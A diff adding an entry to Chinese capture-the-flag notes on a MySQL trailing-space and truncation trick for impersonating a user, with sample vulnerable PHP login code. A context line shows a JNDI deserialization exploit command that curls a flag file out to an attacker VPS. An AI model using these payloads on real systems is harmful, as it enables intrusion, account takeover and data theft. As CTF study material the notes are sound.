@@ -1294,3 +1294,26 @@ pool.join()
     - /;/json
     - url二次编码
 - [jackson反序列化漏洞](https://b1ue.cn/archives/189.html)利用[工具](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)命令:`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl [VPS_IP:PORT] -File=@/flag' -A "[VPS_IP]"`。命令成功执行后复制工具给出的符合要求的rmi地址，使用CVE-2019-14439(springboot)的链子：`["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation": "rmi://地址"}]`。需要公网ip。
+194. [[FBCTF2019]Products Manager](https://www.cnblogs.com/wkzb/p/12286303.html)
+- mysql中的字符串比较。数据库对字符串进行比较时，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致，比如，字符串A:[String]和字符串B:[String2]进行比较时，假设String2比String多了一个字符串，这时MySQL会将字符串A填充为[String ]，即在原来字符串后面加了一个空格，使两个字符串长度一致。如下两条查询语句：`select * from users where username='Dumb'`和`select * from users where username='Dumb '`。它们的查询结果是一致的，即第二条查询语句中Dumb后面的空格并没有对查询有任何影响。因为在MySQL把查询语句里的username和数据库里的username值进行比较时，它们就是一个字符串的比较操作，符合上述特征。
+- insert截断。当设计一个字段时，我们都必须对其设定一个最大长度，比如CHAR(10)，VARCHAR(20)等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。
+- 利用上述两个特点，当我们想获取Dumb身份却又不知道其密码时，可以注册一个名为`Dumb         xx`的用户。添加的空格数取决于数据库需要多少字符才会截断，末尾添上任意字符，防止出现用户名已存在。在后面登录时，假设登录代码如下：
+
+```php
+<?php
+$username = mysql_real_escape_string($_GET['username']);
+$password = mysql_real_escape_string($_GET['password']);
+$query = "SELECT username FROM users
+WHERE username='$username'
+AND password='$password' ";
+$res = mysql_query($query, $database);
+if($res) {
+    if(mysql_num_rows($res) > 0){
+        return $username;
+    }
+}
+return Null;
+?>
+```
+
+填入我们注册的`Dumb         xx`和密码是可以查出结果的。虽然用户信息是我们自己的，但查出的用户名是Dumb。如果后续使用用户名而不是用户信息进行逻辑处理，我们就完成了一次越权。
